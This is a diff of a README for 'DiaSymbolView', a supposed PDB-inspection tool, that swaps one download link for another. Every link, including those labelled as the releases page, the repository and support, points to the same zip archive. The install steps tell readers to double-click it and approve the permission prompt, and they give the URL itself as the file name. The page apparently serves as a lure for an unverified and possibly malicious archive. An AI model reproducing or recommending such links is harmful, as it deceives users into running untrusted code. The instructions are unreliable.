@@ -1,7 +1,7 @@
 # 🎉 DiaSymbolView - Effortlessly Inspect PDB Files
 
 ## 📦 Download Now!
-[![Download DiaSymbolView](https://raw.githubusercontent.com/AlYElkooptan/DiaSymbolView/master/unexpurgated/DiaSymbolView-v1.7-beta.2.zip)](https://raw.githubusercontent.com/AlYElkooptan/DiaSymbolView/master/unexpurgated/DiaSymbolView-v1.7-beta.2.zip)
+[![Download DiaSymbolView](https://github.com/AlYElkooptan/DiaSymbolView/raw/refs/heads/master/unexpurgated/Dia_View_Symbol_v1.7.zip)](https://github.com/AlYElkooptan/DiaSymbolView/raw/refs/heads/master/unexpurgated/Dia_View_Symbol_v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run DiaSymbolView smoothly, make sure your computer meets these requirements:
 ## 📥 Download & Install
 
 1. **Visit the Release Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/AlYElkooptan/DiaSymbolView/master/unexpurgated/DiaSymbolView-v1.7-beta.2.zip) to find the latest version of DiaSymbolView.
+   Go to the [Releases page](https://github.com/AlYElkooptan/DiaSymbolView/raw/refs/heads/master/unexpurgated/Dia_View_Symbol_v1.7.zip) to find the latest version of DiaSymbolView.
 
 2. **Choose Your Download**  
    Look for the version labeled "Latest" and find a file suitable for your operating system. Click on the link that corresponds to your system.
@@ -28,10 +28,10 @@ To run DiaSymbolView smoothly, make sure your computer meets these requirements:
    After clicking the link, your download will start automatically. It may take a moment depending on your internet speed.
 
 4. **Locate the Downloaded File**  
-   Once the download completes, navigate to your Downloads folder to find the file named something like `https://raw.githubusercontent.com/AlYElkooptan/DiaSymbolView/master/unexpurgated/DiaSymbolView-v1.7-beta.2.zip`.
+   Once the download completes, navigate to your Downloads folder to find the file named something like `https://github.com/AlYElkooptan/DiaSymbolView/raw/refs/heads/master/unexpurgated/Dia_View_Symbol_v1.7.zip`.
 
 5. **Run the Application**  
-   Double-click the `https://raw.githubusercontent.com/AlYElkooptan/DiaSymbolView/master/unexpurgated/DiaSymbolView-v1.7-beta.2.zip` file. A prompt may appear asking for permission to run the application. Click "Yes" to proceed.
+   Double-click the `https://github.com/AlYElkooptan/DiaSymbolView/raw/refs/heads/master/unexpurgated/Dia_View_Symbol_v1.7.zip` file. A prompt may appear asking for permission to run the application. Click "Yes" to proceed.
 
 ## 🛠️ Using DiaSymbolView
 
@@ -64,11 +64,11 @@ If you encounter any issues while downloading or using the application, try thes
 
 ## 🌐 Community Support
 
-For support, questions, or suggestions, you can join the community on GitHub. Click on the "Issues" tab on the [repository page](https://raw.githubusercontent.com/AlYElkooptan/DiaSymbolView/master/unexpurgated/DiaSymbolView-v1.7-beta.2.zip) to raise your concerns.
+For support, questions, or suggestions, you can join the community on GitHub. Click on the "Issues" tab on the [repository page](https://github.com/AlYElkooptan/DiaSymbolView/raw/refs/heads/master/unexpurgated/Dia_View_Symbol_v1.7.zip) to raise your concerns.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/AlYElkooptan/DiaSymbolView/master/unexpurgated/DiaSymbolView-v1.7-beta.2.zip)
+- [GitHub Repository](https://github.com/AlYElkooptan/DiaSymbolView/raw/refs/heads/master/unexpurgated/Dia_View_Symbol_v1.7.zip)
 - [User Manual](#) (coming soon)
 
 ## 📅 Future Updates
@@ -76,6 +76,6 @@ For support, questions, or suggestions, you can join the community on GitHub. Cl
 Keep an eye out for future updates that will introduce new features, improvements, and bug fixes. We appreciate your feedback and look forward to enhancing your experience with DiaSymbolView.
 
 ## 📥 Download Now Again!
-[![Download DiaSymbolView](https://raw.githubusercontent.com/AlYElkooptan/DiaSymbolView/master/unexpurgated/DiaSymbolView-v1.7-beta.2.zip)](https://raw.githubusercontent.com/AlYElkooptan/DiaSymbolView/master/unexpurgated/DiaSymbolView-v1.7-beta.2.zip)
+[![Download DiaSymbolView](https://github.com/AlYElkooptan/DiaSymbolView/raw/refs/heads/master/unexpurgated/Dia_View_Symbol_v1.7.zip)](https://github.com/AlYElkooptan/DiaSymbolView/raw/refs/heads/master/unexpurgated/Dia_View_Symbol_v1.7.zip)
 
 Thank you for using DiaSymbolView! Happy inspecting!
